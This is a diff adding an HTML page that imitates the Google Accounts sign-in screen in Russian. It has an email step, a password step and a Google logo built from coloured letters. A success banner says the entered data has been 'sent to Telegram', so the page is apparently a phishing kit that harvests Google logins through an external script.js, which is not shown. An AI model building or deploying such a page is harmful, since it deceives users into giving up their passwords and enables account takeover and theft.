@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Войти – Аккаунты Google</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <!-- Email View -->
+            <div id="emailView">
+                <div class="logo-container">
+                    <div class="google-logo">
+                        <span class="logo-g">G</span>
+                        <span class="logo-o1">o</span>
+                        <span class="logo-o2">o</span>
+                        <span class="logo-g2">g</span>
+                        <span class="logo-l">l</span>
+                        <span class="logo-e">e</span>
+                    </div>
+                </div>
+                
+                <h1 class="title">Вход</h1>
+                <p class="subtitle">Перейти в Google Play</p>
+                
+                <form id="emailForm">
+                    <div class="input-group">
+                        <input type="email" id="email" placeholder="Эл. почта или телефон" required>
+                    </div>
+                    
+                    <a href="#" class="forgot-link">Забыли адрес эл. почты?</a>
+                    
+                    <div class="info-text">
+                        Не на своем компьютере? Используйте гостевой режим для входа без сохранения данных. <a href="#">Подробнее...</a>
+                    </div>
+                    
+                    <div class="button-group">
+                        <button type="button" class="btn-text">Создать аккаунт</button>
+                        <button type="submit" class="btn-primary">Далее</button>
+                    </div>
+                </form>
+            </div>
+
+            <!-- Password View -->
+            <div id="passwordView" class="hidden">
+                <div class="logo-container">
+                    <div class="google-logo">
+                        <span class="logo-g">G</span>
+                        <span class="logo-o1">o</span>
+                        <span class="logo-o2">o</span>
+                        <span class="logo-g2">g</span>
+                        <span class="logo-l">l</span>
+                        <span class="logo-e">e</span>
+                    </div>
+                </div>
+                
+                <div class="profile-picture" id="profilePic">A</div>
+                <div class="user-email" id="userEmail">example@gmail.com</div>
+                
+                <div id="successMsg" class="success-message hidden">
+                    ✓ Данные успешно отправлены в Telegram!
+                </div>
+                
+                <form id="passwordForm">
+                    <div class="input-group">
+                        <input type="password" id="password" placeholder="Введите пароль" required>
+                    </div>
+                    
+                    <a href="#" class="forgot-link">Забыли пароль?</a>
+                    
+                    <div class="button-group">
+                        <button type="button" class="btn-text" onclick="backToEmail()">Назад</button>
+                        <button type="submit" class="btn-primary" id="submitBtn">Далее</button>
+                    </div>
+                </form>
+                
+                <div class="switch-account">
+                    <button onclick="backToEmail()">Войти в другой аккаунт</button>
+                </div>
+            </div>
+        </div>
+        
+        <div class="language-selector">
+            <select>
+                <option>Русский</option>
+                <option>English</option>
+                <option>O'zbek</option>
+                <option>Español</option>
+                <option>Français</option>
+                <option>Deutsch</option>
+            </select>
+        </div>
+        
+        <div class="footer-links">
+            <a href="#">Справка</a>
+            <a href="#">Конфиденциальность</a>
+            <a href="#">Условия</a>
+        </div>
+    </div>
+
+   <script src="script.js"></script>
+</body>
+</html>
